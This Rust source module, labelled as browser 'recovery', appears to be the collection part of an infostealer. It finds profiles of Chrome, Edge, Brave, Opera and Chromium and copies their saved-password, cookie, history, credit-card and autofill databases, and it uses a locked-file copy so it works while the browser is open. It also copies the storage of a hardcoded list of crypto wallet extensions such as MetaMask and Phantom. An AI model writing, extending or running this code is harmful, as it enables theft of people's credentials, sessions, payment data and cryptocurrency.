use crate::recovery::context::RecoveryContext;
use crate::recovery::fs::copy_dir_limited;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use tracing::{debug, warn};

#[derive(Clone, Copy, Debug)]
pub enum BrowserDataKind {
    Passwords,
    Bookmarks,
    History,
    Cookies,
    CreditCards,
    Autofill,
}

impl BrowserDataKind {
    pub const fn all() -> [Self; 6] {
        [
            Self::Passwords,
            Self::Bookmarks,
            Self::History,
            Self::Cookies,
            Self::CreditCards,
            Self::Autofill,
        ]
    }

    pub const fn label(&self) -> &'static str {
        match self {
            Self::Passwords => "Passwords",
            Self::Bookmarks => "Bookmarks",
            Self::History => "History",
            Self::Cookies => "Cookies",
            Self::CreditCards => "Credit Cards",
            Self::Autofill => "Autofill",
        }
    }

    pub const fn file_names(&self) -> &'static [&'static str] {
        match self {
            Self::Passwords => &["Login Data"],
            Self::Bookmarks => &["Bookmarks"],
            Self::History => &["History"],
            Self::Cookies => &["Cookies"],
            Self::CreditCards => &["Web Data", "Web Data-journal"],
            Self::Autofill => &["Web Data", "Web Data-journal"],
        }
    }
}

#[derive(Clone, Copy, Debug)]
pub enum BrowserName {
    Chrome,
    Edge,
    Brave,
    Opera,
    Chromium,
}

impl BrowserName {
    pub fn label(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "Google Chrome",
            BrowserName::Edge => "Microsoft Edge",
            BrowserName::Brave => "Brave Browser",
            BrowserName::Opera => "Opera Browser",
            BrowserName::Chromium => "Chromium",
        }
    }

    pub fn process_name(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "chrome.exe",
            BrowserName::Edge => "msedge.exe",
            BrowserName::Brave => "brave.exe",
            BrowserName::Opera => "opera.exe",
            BrowserName::Chromium => "chromium.exe",
        }
    }
}

#[derive(Clone, Debug)]
pub struct BrowserProfile {
    pub browser: BrowserName,
    pub profile_name: String,
    pub path: PathBuf,
}

impl BrowserProfile {
    pub async fn discover_for_root(browser: BrowserName, root: &Path) -> Vec<Self> {
        let mut profiles = Vec::new();

        let mut dir = match fs::read_dir(root).await {
            Ok(dir) => dir,
            Err(err) => {
                debug!(browser=?browser, path=?root, error=?err, "browser root missing");
                return profiles;
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            if let Ok(metadata) = entry.metadata().await {
                if metadata.is_dir() {
                    let profile_name = entry.file_name().to_string_lossy().into_owned();
                    profiles.push(Self {
                        browser,
                        profile_name,
                        path: entry.path(),
                    });
                }
            }
        }

        let default_profile = root.join("Default");
        if profiles
            .iter()
            .all(|profile| profile.profile_name != "Default")
        {
            if let Ok(metadata) = fs::metadata(&default_profile).await {
                if metadata.is_dir() {
                    profiles.push(Self {
                        browser,
                        profile_name: "Default".into(),
                        path: default_profile,
                    });
                }
            }
        }

        profiles
    }
}

pub struct BrowserRecoveryTask {
    profile: BrowserProfile,
    kind: BrowserDataKind,
}

impl BrowserRecoveryTask {
    pub fn new(profile: BrowserProfile, kind: BrowserDataKind) -> Self {
        Self { profile, kind }
    }
}

#[async_trait]
impl RecoveryTask for BrowserRecoveryTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - {kind}",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name,
            kind = self.kind.label()
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for file_name in self.kind.file_names().iter() {
            let candidate = self.profile.path.join(file_name);
            match fs::metadata(&candidate).await {
                Ok(metadata) if metadata.is_file() => {
                    let mut final_path = candidate.clone();

                    if matches!(
                        self.kind,
                        BrowserDataKind::Cookies
                            | BrowserDataKind::History
                            | BrowserDataKind::Passwords
                    ) {
                        let temp_dir = ctx
                            .output_dir
                            .join("browsers")
                            .join(self.profile.browser.label());
                        let _ = std::fs::create_dir_all(&temp_dir);
                        let dest = temp_dir.join(format!(
                            "{}_{}_{}",
                            self.profile.profile_name,
                            self.kind.label(),
                            file_name
                        ));

                        if super::lockedfile::copy_locked_file(
                            self.profile.browser.process_name(),
                            &candidate,
                            &dest,
                        ) {
                            final_path = dest;
                        }
                    }

                    if let Ok(new_metadata) = fs::metadata(&final_path).await {
                        artifacts.push(RecoveryArtifact {
                            label: self.kind.label().to_string(),
                            path: final_path,
                            size_bytes: new_metadata.len(),
                            modified: new_metadata.modified().ok(),
                        });
                    }
                }
                Ok(_) => {
                    warn!(path=?candidate, "expected file but found directory");
                }
                Err(err) => {
                    debug!(path=?candidate, error=?err, "missing browser artifact");
                }
            }
        }

        Ok(artifacts)
    }
}

pub struct BrowserExtensionTask {
    profile: BrowserProfile,
}

impl BrowserExtensionTask {
    pub fn new(profile: BrowserProfile) -> Self {
        Self { profile }
    }
}

const TARGET_EXTENSIONS: &[(&str, &str)] = &[
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
    ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
    ("Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
];

#[async_trait]
impl RecoveryTask for BrowserExtensionTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - Extensions",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let local_ext_settings = self.profile.path.join("Local Extension Settings");

        if fs::metadata(&local_ext_settings).await.is_err() {
            return Ok(artifacts);
        }

        for (name, id) in TARGET_EXTENSIONS {
            let extension_dir = local_ext_settings.join(id);
            if fs::metadata(&extension_dir).await.is_ok() {
                let dest_root = ctx.output_dir.join("services").join("Wallets").join(format!(
                    "{}_{}_{}",
                    self.profile.browser.label(),
                    self.profile.profile_name,
                    name
                ));
                fs::create_dir_all(&dest_root).await?;

                copy_dir_limited(&extension_dir, &dest_root, name, &mut artifacts, usize::MAX, 0)
                    .await?;
            }
        }

        Ok(artifacts)
    }
}

pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();

    for (browser, root) in browser_data_roots(ctx) {
        let profiles = BrowserProfile::discover_for_root(browser, &root).await;
        for profile in profiles {
            for kind in BrowserDataKind::all() {
                let task: Arc<dyn RecoveryTask> =
                    Arc::new(BrowserRecoveryTask::new(profile.clone(), kind));
                tasks.push(task);
            }
            tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
        }
    }

    tasks
}

pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
    vec![
        (
            BrowserName::Chrome,
            ctx.local_data_dir.join("Google/Chrome/User Data"),
        ),
        (
            BrowserName::Edge,
            ctx.local_data_dir.join("Microsoft/Edge/User Data"),
        ),
        (
            BrowserName::Brave,
            ctx.local_data_dir
                .join("BraveSoftware/Brave-Browser/User Data"),
        ),
        (
            BrowserName::Opera,
            ctx.roaming_data_dir.join("Opera Software/Opera Stable"),
        ),
        (
            BrowserName::Chromium,
            ctx.local_data_dir.join("Chromium/User Data"),
        ),
    ]
}
